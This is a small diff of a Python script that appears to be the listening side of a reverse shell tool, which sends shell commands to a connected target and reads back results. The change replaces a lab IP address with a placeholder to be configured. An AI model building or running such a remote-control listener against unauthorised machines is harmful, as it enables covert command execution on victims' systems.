@@ -53,7 +53,7 @@ def target_communication(): # sending shell commands and retrieving the results
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET refers to the address-family ipv4. The SOCK_STREAM means connection-oriented TCP protocol. 
-s.bind(('10.0.2.22', 12345)) # bind() method which binds it to a specific IP and port so that it can listen to incoming requests on that IP and port.       
+s.bind(('<Listener IP>', 12345)) # <== change IP and port    
 print('[+] Listening for connection...') 
 
 s.listen(5) # we're going to listen up to 5 different connections.
